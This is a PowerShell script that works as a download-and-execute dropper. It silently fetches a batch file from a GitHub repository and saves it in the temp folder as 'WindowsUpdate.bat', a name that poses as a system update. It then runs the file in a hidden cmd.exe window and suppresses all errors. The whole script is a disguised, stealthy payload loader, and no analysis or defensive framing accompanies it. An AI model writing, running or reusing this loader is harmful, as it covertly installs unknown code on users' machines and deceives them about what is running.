# Enforce TLS 1.2 for GitHub connection
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12


$fileUrl = "https://github.com/anunnakigud1/hellosir/raw/refs/heads/main/oniway.bat"
$downloadPath = "$env:TEMP\WindowsUpdate.bat"

try {
    # Silent download
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri $fileUrl -OutFile $downloadPath -UseBasicParsing

    # Hidden execution
    if (Test-Path $downloadPath) {
        Start-Process cmd.exe -WindowStyle Hidden -ArgumentList "/c `"$downloadPath`""
    }
}
catch {
    # Optional: Add error logging to hidden file if needed
    # $_.Exception.Message | Out-File "$env:TEMP\error.log" -Append
}